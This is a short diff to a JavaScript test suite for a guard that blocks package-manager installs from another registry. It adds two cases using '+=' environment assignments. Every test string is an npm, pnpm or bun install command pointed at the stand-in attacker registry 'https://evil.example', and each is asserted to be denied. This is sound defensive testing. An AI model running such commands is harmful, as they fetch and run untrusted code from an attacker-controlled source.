@@ -92,6 +92,8 @@ describe('a package manager that takes the guard package from somewhere else is 
     'npm install --registry https://evil.example',
     'pnpm --registry https://evil.example add left-pad',
     'BUN_CONFIG_REGISTRY=https://evil.example bun install',
+    'BUN_CONFIG_REGISTRY+=https://evil.example bun install',
+    'npm_config_registry+=https://evil.example npm install',
     'npm_config_registry=https://evil.example npm install',
     'NPM_CONFIG_REGISTRY=https://evil.example pnpm install',
   ])('%s is denied: the source of the install is set on the line', (command) => {
